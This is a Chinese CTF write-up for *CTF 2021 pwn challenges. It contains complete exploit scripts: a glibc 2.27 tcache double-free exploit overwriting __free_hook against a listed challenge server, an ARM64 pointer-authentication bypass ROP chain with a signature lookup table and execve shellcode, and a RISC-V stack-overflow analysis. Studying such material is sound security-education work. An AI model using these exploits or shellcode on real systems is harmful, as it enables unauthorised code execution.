# *CTF 2021


赛前科恩那边说二进制的题应该没什么难度，我知道我很弱了不要再说了...放假比较闲那就慢慢复现学习一下吧
* babyheap：tcache_struct, double free, 新libc
* babypac：ARMv8.3, pac, ROP
* fav arch1：RISC-V64 ROP
* fav arch2：qemu sandbox bypass, RISC-V ROP
* babygame： C++析构函数, double free
* babyxv6：RISC-V, kernel, 自定义漏洞syscall

<!--more-->

## babyheap

用的新libc2.27，添加了类似于2.29的tcache检测，最新的diff如下。提前已经知道了所以这题出的很快，可惜没抢到血。

![](https://i.loli.net/2021/01/23/xVwiAZBdIGS6Kco.png)

由于edit改不了前面的8个字节，所以double free只能先打到堆上tcache结构体，使任意分配的同时将0x410的tcache的count填满，让输入name的chunk能直接进入unsorted bin去泄露libc地址，最后tcache poisoning去打free_hook（one_gadget没打通所以没打malloc_hook）

```python
#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep
import sys

global io
ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

# amd64 or x86
context(arch = 'amd64', endian = 'little')
context.log_level = 'debug'

filename = "./pwn"
ip = "52.152.231.198"
port = 8081

LOCAL = False if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc.so.6"
if LOCAL:
    io = process(filename, aslr=False)
    libc = ELF(remote_libc)
else:
    context.log_level = 'info'
    io = remote(ip, port)
    libc = ELF(remote_libc)

def choice(p, idx):
    sla(p, XXX, str(idx))
    
def lg(name, val):
    log.info(name+" : "+hex(val))

def add(idx, size):
    sla(io,">> ",'1')
    sla(io,"input index\n",str(idx))
    sla(io,"input size\n",str(size))

def edit(idx, con):
    sla(io,">> ",'3')
    sla(io,"input index\n",str(idx))
    sla(io,"input content\n",con)

def free(idx):
    sla(io,">> ",'2')
    sla(io,"input index\n",str(idx))

def show(idx):
    sla(io,">> ",'4')
    sla(io,"input index\n",str(idx))

def input_name(name):
    sla(io,">> ",'5')
    sla(io,"your name:\n",name)

def show_name():
    sla(io, ">> ", '6')

add(0, 0x60)
for i in range(7):
    free(0)
    edit(0, str(i))

add(1, 0x50)
for i in range(7):
    free(1)
    edit(1, str(i))

show(0)
heap_addr = u64(io.recv(6)+'\x00\x00')
lg("heap_addr", heap_addr)
free(0)
free(1)

input_name(p64(heap_addr - 0x260 + 0x40))
for i in range(2):
    add(2, 0x60)
edit(2, p64(0x0707070707070707))
add(3, 0x20)
free(0)
show(0)
libc_addr = u64(io.recv(6)+'\x00\x00') - 0x3ebca0
lg("libc_addr", libc_addr)
# raw_input()
malloc_hook = libc_addr + libc.sym['__malloc_hook']
lg("malloc_hook", malloc_hook)

free_hook = libc_addr + libc.sym['__free_hook']
lg("free_hook", free_hook)
sys_addr= libc_addr + libc.sym['system']

edit(2, p64(0x0707070707070707)+p64(free_hook-8)*2)

one = [0x10a41c, 0x4f432, 0x4f3d5]

add(4, 0x20)
edit(4, p64(sys_addr))

add(5, 0x40)
edit(5, '/bin/sh\x00'*3)
edit(2, p64(0x0707070707070707)+p64(heap_addr+0x10)*3)

add(5, 0x30)
free(5)

io.interactive()
```

## babypac

arm64架构，装好qemu-user后直接运行cmd就能跑

auth与lock函数都可以负溢出，于是可以充分利用最先输入的name让其成功auth，进入到后门函数sub_400BDC，为qemu-user的arm64栈溢出。题目中pac的意思为Pointer authentication，是ARMv8.3-A对抗ROP攻击的一项技术，攻破该技术便是出题者的意图。

```c
ssize_t sub_400BDC()
{
  __int64 v1; // [xsp+0h] [xbp-20h] BYREF

  return read(0, &v1, 0x100uLL);                // stack_overflow
}
```

如果没有注意到负溢出，直接硬刚sub_4009D8也行，但是注意PACIA命令

```c
unsigned __int64 __fastcall sub_4009D8(__int64 a1)
{
  return a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11)) << 31) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11)) << 31)) >> 13);
}
```

他会先将0x10A9FC70042填充成`0x**10A9FC70042`，其中`**`是未知的，然后再进入sub_4009D8进行一系列encode操作，所以只能爆破这两个`**`，比较麻烦。这一个未知的字节便是PAC，我们稍后也会遇到。

```assembly
.text:0000000000400D54 loc_400D54                              ; CODE XREF: auth+74↑j
.text:0000000000400D54                 MOV             X8, #0x10A9FC70042
.text:0000000000400D60                 STR             X8, [SP,#0x20+var_10]
.text:0000000000400D64                 LDR             X8, [SP,#0x20+var_10]
.text:0000000000400D68                 PACIA           X8, SP
.text:0000000000400D6C                 STR             X8, [SP,#0x20+var_10]
.text:0000000000400D70                 LDURSW          X8, [X29,#var_4]
.text:0000000000400D74                 ADRL            X9, name
.text:0000000000400D7C                 ADD             X8, X9, X8,LSL#4
.text:0000000000400D80                 LDR             X8, [X8,#0x20]
.text:0000000000400D84                 LDR             X0, [SP,#0x20+var_10]
.text:0000000000400D88                 STR             X8, [SP,#0x20+var_20]
.text:0000000000400D8C                 BL              encode
```

而如果利用负溢出漏洞，idx=-1就是我们可控的name区域，所以事先填入`0x10A9FC70042`后lock(-1)并auth(-1)就能通过校验，进入到栈溢出函数。

我们先把ROP链写好。先简单说一下ARM64的指令集与常识

* ARM64 取消了32位的 LDM,STM,PUSH,POP指令，取而代之的是str\stp、ldr\ldp
* **ARM64 里面对栈的操作是16字节对齐**
* sp寄存器在任意时刻会保存栈顶的地址
* fp寄存器也称为x29寄存器属于通用寄存器,但是在某些时刻我们利用它保存栈底的地址
* x30：链接寄存器（LR），用于保存子程序的返回地址
* ARM64用寄存器传参

来看看栈溢出函数，用BL调用了read函数后开始还原栈帧

* X29=fp=[SP+0x20]，相当于x86的还原上一个栈帧的rbp
* X30=LR=[SP+0x28]，ARM64把返回地址放在寄存器LR内，在栈上的位置也是rbp+8
* 将sp直接向上提0x30，复原栈顶指针
* 最后retaa返回到返回地址

可以看到ARM64的fp(rbp)是通过直接赋值来还原的，所以在布置ROP链的时候总是要考虑rbp的位置

```assembly
backdoor                                ; CODE XREF: auth:loc_400DA0↓p
.text:0000000000400BDC
.text:0000000000400BDC var_s0          =  0
.text:0000000000400BDC
.text:0000000000400BDC                 PACIASP
.text:0000000000400BE0                 SUB             SP, SP, #0x30
.text:0000000000400BE4                 STP             X29, X30, [SP,#0x20+var_s0]
.text:0000000000400BE8                 ADD             X29, SP, #0x20
.text:0000000000400BEC                 MOV             W8, WZR
.text:0000000000400BF0                 MOV             X2, #0x100 ; nbytes
.text:0000000000400BF4                 MOV             X1, SP  ; buf
.text:0000000000400BF8                 MOV             W0, W8  ; fd
.text:0000000000400BFC                 BL              .read
.text:0000000000400C00                 LDP             X29, X30, [SP,#0x20+var_s0]
.text:0000000000400C04                 ADD             SP, SP, #0x30 ; '0'
.text:0000000000400C08                 RETAA
```

一般来说可以找一些gadget然后mprotect写shellcode，这里没开NX所以直接在bss段写就行。

参考https://blog.csdn.net/qq_39869547/article/details/105255683

这段gadget位于csu处，是一定会有的

```assembly
.text:0000000000400FD8 loc_400FD8                              ; CODE XREF: sub_400F90+64↓j
.text:0000000000400FD8                 LDR             X3, [X21,X19,LSL#3]
.text:0000000000400FDC                 MOV             X2, X24
.text:0000000000400FE0                 ADD             X19, X19, #1
.text:0000000000400FE4                 MOV             X1, X23
.text:0000000000400FE8                 MOV             W0, W22
.text:0000000000400FEC                 BLR             X3
.text:0000000000400FF0                 CMP             X20, X19
.text:0000000000400FF4                 B.NE            loc_400FD8
.text:0000000000400FF8
.text:0000000000400FF8 loc_400FF8                              ; CODE XREF: sub_400F90+3C↑j
.text:0000000000400FF8                 LDP             X19, X20, [SP,#var_s10] 
.text:0000000000400FFC                 LDP             X21, X22, [SP,#var_s20]
.text:0000000000401000                 LDP             X23, X24, [SP,#var_s30]
.text:0000000000401004                 LDP             X29, X30, [SP+var_s0],#0x40
.text:0000000000401008                 RET
```

该ROP链的思路是：

{{< admonition info >}}
布置栈帧→ 跳到loc_400FF8控制X19-X30 → 返回到loc_400FD8 → 控制X0-X3（控制参数）→ 跳到X3(read@got) → 写shellcode → 使X20=X19让其不跳回loc_400FD8而继续执行 → 再次控制X19-X30  → 返回到shellcode处getshell
{{< /admonition >}}
 

所以我们的ROP链如下：

```python
"""
w0 = w22
x1 = x23
x2 = x24
x3 = [X21+X19<<3] -> read

x19 = 0
x20 = 0
x21 = read_addr
x22 = 0
x23 = sc_addr
x24 = 0x100

x29 = stack_frame

"""
fake_fp = 0x412500 // .bss
sc_addr = 0x412060 // .bss
rop = 'a'*0x20
rop += flat(fake_fp, 0x400FF8,  // fp0, ret_addr0
            // ->when in 0x400FF8, sp is here
            fake_fp, 0x400FD8, // X29, X30   
            0, 0, // X19, X20
            read_got, 0, //X21, X22->X0
            sc_addr, 0x100, //X23->X1, X24->X2
            fake_fp, sc_addr
           )
```

这样直接ROP会被PAC拦截

```bash
[*] Switching to interactive mode
[DEBUG] Received 0x43 bytes:
    'qemu: uncaught target signal 11 (Segmentation fault) - core dumped\n'
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Process '/usr/bin/qemu-aarch64' stopped with exit code -11 (SIGSEGV) (pid 5123)
```

调试发现retaa指令返回之后跳到了一个奇奇怪怪的地方

```bash
Invalid address 0x20000000400ff8
```

发现栈溢出函数中一头一尾有PACIASP与RETAA指令，查阅官方资料

> | instruction | function                                                     |
> | ----------- | ------------------------------------------------------------ |
> | PACIxSP     | Sign LR, using SP as the modifier.                           |
> | PACIxZ      | Sign LR, using 0 as the modifier.                            |
> | PACIx       | Sign Xn, using a general-purpose register as modifier.       |
> | AUTIxSP     | Authenticate LR, using SP as the modifier.                   |
> | AUTIxZ      | Authenticate LR, using 0 as the modifier.                    |
> | AUTIx       | Authenticate Xn, using a general-purpose register as modifier. |
> | BRAx        | Indirect branch with pointer authentication.                 |
> | BLRAx       | Indirect branch with link, with pointer authentication.      |
> | RETAx       | Function return with pointer authentication.                 |
> | ERETAx      | Exception return with pointer authentication.                |
>
>
> In each case, replace x with A or B to select the wanted key.

PACIASP会让SP填充一个随机字节（PAC）做签名，然后在retaa首先会比较签名，只有正确后才会返回，所以我们首先得想办法拿到0x400FF8地址对应的sign。

我们可以建一个map，用如下C语言程序模拟该字节所有情况下通过encode以后的值并全部存储下来

```c
uint64_t encode(int64_t a1)
{
  return a1 ^ (a1 << 7) ^ ((a1 ^ (uint64_t)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (uint64_t)(a1 << 7)) >> 11)) << 31) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (uint64_t)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (uint64_t)(a1 << 7)) >> 11)) << 31)) >> 13);
}

int main(){
    int64_t a = 0x44010A9FC70042;
    uint64_t b= encode(a);
    printf("%#llx -> %#llx\n", (long long unsigned int)a, (long long unsigned int)b);
    printf("{");
    for (uint64_t i=0; i<0x100; i++){
        a = (i << 48) | 0x400FF8;  # 该字节从0x00-0xff
        b = encode(a);
        printf("    %#llx : %#llx,\n", (long long unsigned int)b, (long long unsigned int)a);
    }
    printf("}\n");
	return 0;
}
```

 然后再次利用负溢出漏洞，查表便可以知道该0x400FF8对应的签名的随机字节到底是多少，至此我们终于能ROP了，找个能用的shellcode就能打通了！

完整exp如下

```python
from pwn import *

context(arch = 'aarch64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

io = process(["qemu-aarch64", "-cpu", "max",  "-L", ".", "./chall"])

def choice(ch):
  io.sendlineafter(">> ", str(ch))

def lock(idx):
  choice(2)
  io.sendlineafter("idx: ", str(idx))
  
def auth(idx):
  choice(4)
  io.sendlineafter("idx: ", str(idx))
  
def show():
  choice(3)

name = p64(0x400FF8) + p64(0) + p64(0x10A9FC70042) + p64(0)

io.sendafter("name: ", name)

lock(-2)
show()
io.recvuntil("name: ")
auth_addr = u64(io.recv(8))
success("auth_addr : @"+hex(auth_addr))

lock(-1)
auth(-1)

mapping = {    0x10217c8ccc5af919 : 0x400ff8,
    0x10a068a44d5af919 : 0x1000000400ff8,
    0x112354ddce5af919 : 0x2000000400ff8,
    0x11a240f54f5af919 : 0x3000000400ff8,
    0x12252c2ec85af919 : 0x4000000400ff8,
    0x12a43806495af919 : 0x5000000400ff8,
    0x1327047fca5af919 : 0x6000000400ff8,
    0x13a610574b5af919 : 0x7000000400ff8,
    0x1429ddc8c45af919 : 0x8000000400ff8,
    0x14a8c9e0455af919 : 0x9000000400ff8,
    0x152bf599c65af919 : 0xa000000400ff8,
    0x15aae1b1475af919 : 0xb000000400ff8,
    0x162d8d6ac05af919 : 0xc000000400ff8,
    0x16ac9942415af919 : 0xd000000400ff8,
    0x172fa53bc25af919 : 0xe000000400ff8,
    0x17aeb113435af919 : 0xf000000400ff8,
    0x18303e04dc5af919 : 0x10000000400ff8,
    0x18b12a2c5d5af919 : 0x11000000400ff8,
    0x19321655de5af919 : 0x12000000400ff8,
    0x19b3027d5f5af919 : 0x13000000400ff8,
    0x1a346ea6d85af919 : 0x14000000400ff8,
    0x1ab57a8e595af919 : 0x15000000400ff8,
    0x1b3646f7da5af919 : 0x16000000400ff8,
    0x1bb752df5b5af919 : 0x17000000400ff8,
    0x1c389f40d45af919 : 0x18000000400ff8,
    0x1cb98b68555af919 : 0x19000000400ff8,
    0x1d3ab711d65af919 : 0x1a000000400ff8,
    0x1dbba339575af919 : 0x1b000000400ff8,
    0x1e3ccfe2d05af919 : 0x1c000000400ff8,
    0x1ebddbca515af919 : 0x1d000000400ff8,
    0x1f3ee7b3d25af919 : 0x1e000000400ff8,
    0x1fbff39b535af919 : 0x1f000000400ff8,
    0x3f99cec5af919 : 0x20000000400ff8,
    0x82edb46d5af919 : 0x21000000400ff8,
    0x101d1cdee5af919 : 0x22000000400ff8,
    0x180c5e56f5af919 : 0x23000000400ff8,
    0x207a93ee85af919 : 0x24000000400ff8,
    0x286bd16695af919 : 0x25000000400ff8,
    0x305816fea5af919 : 0x26000000400ff8,
    0x38495476b5af919 : 0x27000000400ff8,
    0x40b58d8e45af919 : 0x28000000400ff8,
    0x48a4cf0655af919 : 0x29000000400ff8,
    0x5097089e65af919 : 0x2a000000400ff8,
    0x58864a1675af919 : 0x2b000000400ff8,
    0x60f087ae05af919 : 0x2c000000400ff8,
    0x68e1c52615af919 : 0x2d000000400ff8,
    0x70d202be25af919 : 0x2e000000400ff8,
    0x78c3403635af919 : 0x2f000000400ff8,
    0x812bb14fc5af919 : 0x30000000400ff8,
    0x893af3c7d5af919 : 0x31000000400ff8,
    0x9109345fe5af919 : 0x32000000400ff8,
    0x991876d7f5af919 : 0x33000000400ff8,
    0xa16ebb6f85af919 : 0x34000000400ff8,
    0xa97ff9e795af919 : 0x35000000400ff8,
    0xb14c3e7fa5af919 : 0x36000000400ff8,
    0xb95d7cf7b5af919 : 0x37000000400ff8,
    0xc1a1a50f45af919 : 0x38000000400ff8,
    0xc9b0e78755af919 : 0x39000000400ff8,
    0xd183201f65af919 : 0x3a000000400ff8,
    0xd992629775af919 : 0x3b000000400ff8,
    0xe1e4af2f05af919 : 0x3c000000400ff8,
    0xe9f5eda715af919 : 0x3d000000400ff8,
    0xf1c62a3f25af919 : 0x3e000000400ff8,
    0xf9d768b735af919 : 0x3f000000400ff8,
    0x306476ac8c5af919 : 0x40000000400ff8,
    0x30e562840d5af919 : 0x41000000400ff8,
    0x31665efd8e5af919 : 0x42000000400ff8,
    0x31e74ad50f5af919 : 0x43000000400ff8,
    0x3260260e885af919 : 0x44000000400ff8,
    0x32e13226095af919 : 0x45000000400ff8,
    0x33620e5f8a5af919 : 0x46000000400ff8,
    0x33e31a770b5af919 : 0x47000000400ff8,
    0x346cd7e8845af919 : 0x48000000400ff8,
    0x34edc3c0055af919 : 0x49000000400ff8,
    0x356effb9865af919 : 0x4a000000400ff8,
    0x35efeb91075af919 : 0x4b000000400ff8,
    0x3668874a805af919 : 0x4c000000400ff8,
    0x36e99362015af919 : 0x4d000000400ff8,
    0x376aaf1b825af919 : 0x4e000000400ff8,
    0x37ebbb33035af919 : 0x4f000000400ff8,
    0x387534249c5af919 : 0x50000000400ff8,
    0x38f4200c1d5af919 : 0x51000000400ff8,
    0x39771c759e5af919 : 0x52000000400ff8,
    0x39f6085d1f5af919 : 0x53000000400ff8,
    0x3a716486985af919 : 0x54000000400ff8,
    0x3af070ae195af919 : 0x55000000400ff8,
    0x3b734cd79a5af919 : 0x56000000400ff8,
    0x3bf258ff1b5af919 : 0x57000000400ff8,
    0x3c7d9560945af919 : 0x58000000400ff8,
    0x3cfc8148155af919 : 0x59000000400ff8,
    0x3d7fbd31965af919 : 0x5a000000400ff8,
    0x3dfea919175af919 : 0x5b000000400ff8,
    0x3e79c5c2905af919 : 0x5c000000400ff8,
    0x3ef8d1ea115af919 : 0x5d000000400ff8,
    0x3f7bed93925af919 : 0x5e000000400ff8,
    0x3ffaf9bb135af919 : 0x5f000000400ff8,
    0x2046f3bcac5af919 : 0x60000000400ff8,
    0x20c7e7942d5af919 : 0x61000000400ff8,
    0x2144dbedae5af919 : 0x62000000400ff8,
    0x21c5cfc52f5af919 : 0x63000000400ff8,
    0x2242a31ea85af919 : 0x64000000400ff8,
    0x22c3b736295af919 : 0x65000000400ff8,
    0x23408b4faa5af919 : 0x66000000400ff8,
    0x23c19f672b5af919 : 0x67000000400ff8,
    0x244e52f8a45af919 : 0x68000000400ff8,
    0x24cf46d0255af919 : 0x69000000400ff8,
    0x254c7aa9a65af919 : 0x6a000000400ff8,
    0x25cd6e81275af919 : 0x6b000000400ff8,
    0x264a025aa05af919 : 0x6c000000400ff8,
    0x26cb1672215af919 : 0x6d000000400ff8,
    0x27482a0ba25af919 : 0x6e000000400ff8,
    0x27c93e23235af919 : 0x6f000000400ff8,
    0x2857b134bc5af919 : 0x70000000400ff8,
    0x28d6a51c3d5af919 : 0x71000000400ff8,
    0x29559965be5af919 : 0x72000000400ff8,
    0x29d48d4d3f5af919 : 0x73000000400ff8,
    0x2a53e196b85af919 : 0x74000000400ff8,
    0x2ad2f5be395af919 : 0x75000000400ff8,
    0x2b51c9c7ba5af919 : 0x76000000400ff8,
    0x2bd0ddef3b5af919 : 0x77000000400ff8,
    0x2c5f1070b45af919 : 0x78000000400ff8,
    0x2cde0458355af919 : 0x79000000400ff8,
    0x2d5d3821b65af919 : 0x7a000000400ff8,
    0x2ddc2c09375af919 : 0x7b000000400ff8,
    0x2e5b40d2b05af919 : 0x7c000000400ff8,
    0x2eda54fa315af919 : 0x7d000000400ff8,
    0x2f596883b25af919 : 0x7e000000400ff8,
    0x2fd87cab335af919 : 0x7f000000400ff8,
    0x50ab68cc4c5af919 : 0x80000000400ff8,
    0x502a7ce4cd5af919 : 0x81000000400ff8,
    0x51a9409d4e5af919 : 0x82000000400ff8,
    0x512854b5cf5af919 : 0x83000000400ff8,
    0x52af386e485af919 : 0x84000000400ff8,
    0x522e2c46c95af919 : 0x85000000400ff8,
    0x53ad103f4a5af919 : 0x86000000400ff8,
    0x532c0417cb5af919 : 0x87000000400ff8,
    0x54a3c988445af919 : 0x88000000400ff8,
    0x5422dda0c55af919 : 0x89000000400ff8,
    0x55a1e1d9465af919 : 0x8a000000400ff8,
    0x5520f5f1c75af919 : 0x8b000000400ff8,
    0x56a7992a405af919 : 0x8c000000400ff8,
    0x56268d02c15af919 : 0x8d000000400ff8,
    0x57a5b17b425af919 : 0x8e000000400ff8,
    0x5724a553c35af919 : 0x8f000000400ff8,
    0x58ba2a445c5af919 : 0x90000000400ff8,
    0x583b3e6cdd5af919 : 0x91000000400ff8,
    0x59b802155e5af919 : 0x92000000400ff8,
    0x5939163ddf5af919 : 0x93000000400ff8,
    0x5abe7ae6585af919 : 0x94000000400ff8,
    0x5a3f6eced95af919 : 0x95000000400ff8,
    0x5bbc52b75a5af919 : 0x96000000400ff8,
    0x5b3d469fdb5af919 : 0x97000000400ff8,
    0x5cb28b00545af919 : 0x98000000400ff8,
    0x5c339f28d55af919 : 0x99000000400ff8,
    0x5db0a351565af919 : 0x9a000000400ff8,
    0x5d31b779d75af919 : 0x9b000000400ff8,
    0x5eb6dba2505af919 : 0x9c000000400ff8,
    0x5e37cf8ad15af919 : 0x9d000000400ff8,
    0x5fb4f3f3525af919 : 0x9e000000400ff8,
    0x5f35e7dbd35af919 : 0x9f000000400ff8,
    0x4089eddc6c5af919 : 0xa0000000400ff8,
    0x4008f9f4ed5af919 : 0xa1000000400ff8,
    0x418bc58d6e5af919 : 0xa2000000400ff8,
    0x410ad1a5ef5af919 : 0xa3000000400ff8,
    0x428dbd7e685af919 : 0xa4000000400ff8,
    0x420ca956e95af919 : 0xa5000000400ff8,
    0x438f952f6a5af919 : 0xa6000000400ff8,
    0x430e8107eb5af919 : 0xa7000000400ff8,
    0x44814c98645af919 : 0xa8000000400ff8,
    0x440058b0e55af919 : 0xa9000000400ff8,
    0x458364c9665af919 : 0xaa000000400ff8,
    0x450270e1e75af919 : 0xab000000400ff8,
    0x46851c3a605af919 : 0xac000000400ff8,
    0x46040812e15af919 : 0xad000000400ff8,
    0x4787346b625af919 : 0xae000000400ff8,
    0x47062043e35af919 : 0xaf000000400ff8,
    0x4898af547c5af919 : 0xb0000000400ff8,
    0x4819bb7cfd5af919 : 0xb1000000400ff8,
    0x499a87057e5af919 : 0xb2000000400ff8,
    0x491b932dff5af919 : 0xb3000000400ff8,
    0x4a9cfff6785af919 : 0xb4000000400ff8,
    0x4a1debdef95af919 : 0xb5000000400ff8,
    0x4b9ed7a77a5af919 : 0xb6000000400ff8,
    0x4b1fc38ffb5af919 : 0xb7000000400ff8,
    0x4c900e10745af919 : 0xb8000000400ff8,
    0x4c111a38f55af919 : 0xb9000000400ff8,
    0x4d922641765af919 : 0xba000000400ff8,
    0x4d133269f75af919 : 0xbb000000400ff8,
    0x4e945eb2705af919 : 0xbc000000400ff8,
    0x4e154a9af15af919 : 0xbd000000400ff8,
    0x4f9676e3725af919 : 0xbe000000400ff8,
    0x4f1762cbf35af919 : 0xbf000000400ff8,
    0x70ee62ec0c5af919 : 0xc0000000400ff8,
    0x706f76c48d5af919 : 0xc1000000400ff8,
    0x71ec4abd0e5af919 : 0xc2000000400ff8,
    0x716d5e958f5af919 : 0xc3000000400ff8,
    0x72ea324e085af919 : 0xc4000000400ff8,
    0x726b2666895af919 : 0xc5000000400ff8,
    0x73e81a1f0a5af919 : 0xc6000000400ff8,
    0x73690e378b5af919 : 0xc7000000400ff8,
    0x74e6c3a8045af919 : 0xc8000000400ff8,
    0x7467d780855af919 : 0xc9000000400ff8,
    0x75e4ebf9065af919 : 0xca000000400ff8,
    0x7565ffd1875af919 : 0xcb000000400ff8,
    0x76e2930a005af919 : 0xcc000000400ff8,
    0x76638722815af919 : 0xcd000000400ff8,
    0x77e0bb5b025af919 : 0xce000000400ff8,
    0x7761af73835af919 : 0xcf000000400ff8,
    0x78ff20641c5af919 : 0xd0000000400ff8,
    0x787e344c9d5af919 : 0xd1000000400ff8,
    0x79fd08351e5af919 : 0xd2000000400ff8,
    0x797c1c1d9f5af919 : 0xd3000000400ff8,
    0x7afb70c6185af919 : 0xd4000000400ff8,
    0x7a7a64ee995af919 : 0xd5000000400ff8,
    0x7bf958971a5af919 : 0xd6000000400ff8,
    0x7b784cbf9b5af919 : 0xd7000000400ff8,
    0x7cf78120145af919 : 0xd8000000400ff8,
    0x7c769508955af919 : 0xd9000000400ff8,
    0x7df5a971165af919 : 0xda000000400ff8,
    0x7d74bd59975af919 : 0xdb000000400ff8,
    0x7ef3d182105af919 : 0xdc000000400ff8,
    0x7e72c5aa915af919 : 0xdd000000400ff8,
    0x7ff1f9d3125af919 : 0xde000000400ff8,
    0x7f70edfb935af919 : 0xdf000000400ff8,
    0x60cce7fc2c5af919 : 0xe0000000400ff8,
    0x604df3d4ad5af919 : 0xe1000000400ff8,
    0x61cecfad2e5af919 : 0xe2000000400ff8,
    0x614fdb85af5af919 : 0xe3000000400ff8,
    0x62c8b75e285af919 : 0xe4000000400ff8,
    0x6249a376a95af919 : 0xe5000000400ff8,
    0x63ca9f0f2a5af919 : 0xe6000000400ff8,
    0x634b8b27ab5af919 : 0xe7000000400ff8,
    0x64c446b8245af919 : 0xe8000000400ff8,
    0x64455290a55af919 : 0xe9000000400ff8,
    0x65c66ee9265af919 : 0xea000000400ff8,
    0x65477ac1a75af919 : 0xeb000000400ff8,
    0x66c0161a205af919 : 0xec000000400ff8,
    0x66410232a15af919 : 0xed000000400ff8,
    0x67c23e4b225af919 : 0xee000000400ff8,
    0x67432a63a35af919 : 0xef000000400ff8,
    0x68dda5743c5af919 : 0xf0000000400ff8,
    0x685cb15cbd5af919 : 0xf1000000400ff8,
    0x69df8d253e5af919 : 0xf2000000400ff8,
    0x695e990dbf5af919 : 0xf3000000400ff8,
    0x6ad9f5d6385af919 : 0xf4000000400ff8,
    0x6a58e1feb95af919 : 0xf5000000400ff8,
    0x6bdbdd873a5af919 : 0xf6000000400ff8,
    0x6b5ac9afbb5af919 : 0xf7000000400ff8,
    0x6cd50430345af919 : 0xf8000000400ff8,
    0x6c541018b55af919 : 0xf9000000400ff8,
    0x6dd72c61365af919 : 0xfa000000400ff8,
    0x6d563849b75af919 : 0xfb000000400ff8,
    0x6ed15492305af919 : 0xfc000000400ff8,
    0x6e5040bab15af919 : 0xfd000000400ff8,
    0x6fd37cc3325af919 : 0xfe000000400ff8,
    0x6f5268ebb35af919 : 0xff000000400ff8,
}

fake_fp = 0x412500 # .bss
sc_addr = 0x412060 
read_got = 0x411FD8
rop = 'a'*0x20
success("ret_addr : @"+hex(mapping[auth_addr]))
rop += flat(fake_fp, mapping[auth_addr],  # fp0, ret_addr0
            # when in 0x400FF8, sp is here
            fake_fp, 0x400FD8, # X29, X30   
            0, 1, # X19, X20
            read_got, 0, # X21, X22->X0
            sc_addr, 0x100, # X23->X1, X24->X2
            fake_fp, sc_addr)

io.sendline(rop)
sc = "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
io.sendline(sc)

io.interactive()

```

## favourite architecture 1

risc-v架构，64位，用Ghidra9.2反编译。符号表被扬了

```c
undefined8 UndefinedFunction_00010400(void)

{
  ulonglong uVar1;
  longlong lVar2;
  undefined auStack488 [192];
  undefined auStack296 [256];
  ulonglong uStack40;
  longlong lStack32;
  int iStack20;
  
  FUN_00017d74(PTR_DAT_0006ea28,0);
  FUN_00017d74(PTR_DAT_0006ea20,0);
  FUN_00017d74(PTR_DAT_0006ea18,0);
  FUN_0001605a("Input the flag: ");
  FUN_00016a5a(auStack296);
  uVar1 = FUN_000204e4(auStack296);
  if (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) & 0xffffffffU)) {
    lStack32 = FUN_00020386(auStack296 + ((longlong)iRam000000000006e9d8 & 0xffffffff));
    FUN_0001118a(auStack488,"tzgkwukglbslrmfjsrwimtwyyrkejqzo","oaeqjfhclrqk",0x80);
    FUN_000111ea(auStack488,auStack296,iRam000000000006e9d8);
    lVar2 = FUN_00020e2a(auStack296,&DAT_0006d000,iRam000000000006e9d8);
    if (lVar2 == 0) {
      uStack40 = FUN_000204e4(lStack32);
      iStack20 = 0;
      while( true ) {
        if (uStack40 >> 3 <= (ulonglong)(longlong)iStack20) {
          FUN_00016bc8("You are right :D");
          gp = (undefined *)0x6f178;
          return 0;
        }
        FUN_000102ae(iStack20 * 8 + lStack32,&DAT_0006d060);
        lVar2 = FUN_00020e2a(iStack20 * 8 + lStack32,(longlong)(iStack20 * 8) + 0x6d030,8);
        if (lVar2 != 0) break;
        iStack20 = iStack20 + 1;
      }
    }
  }
  FUN_00016bc8("You are wrong ._.");
  gp = (undefined *)0x6f178;
  return 1;
}


```

用题目给的qemu跑一下

```bash
$ ./qemu-riscv64 ./main 
Input the flag: 1
You are wrong ._.
$ 
```

人工fuzz一下，出现段错误

```python
io.sendlineafter("Input the flag: ",'a'*0x120+'b'*8)
```

猜测读入的函数为gets()，没有检测读入长度。

```bash
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x6262626262626262 in ?? ()
(gdb)
```

边调试边尝试恢复程序主要流程（逆向部分favourite architecture 0省略），是一个RISC-V64的栈溢出。auStack296在`s0-0x128`处，返回地址距离栈底0x120

```CQL
undefined8 UndefinedFunction_00010400(void)

{
  ulonglong uVar1;
  longlong lVar2;
  undefined auStack488 [192];
  undefined auStack296 [256];
  ulonglong uStack40;
  longlong lStack32;
  int iStack20;
  
  init_buf(PTR_DAT_0006ea28,0);
  init_buf(PTR_DAT_0006ea20,0);
  init_buf(PTR_DAT_0006ea18,0);
  pRint("Input the flag: ");
  gEts(auStack296);  // stack_overflow
  ...
  
}
```

下面我们来做RISC-V ROP，控制ra, a0-a2等寄存器便能任意执行函数。

![](https://i.loli.net/2021/01/27/DwxjP4bmFdK9e8r.png)
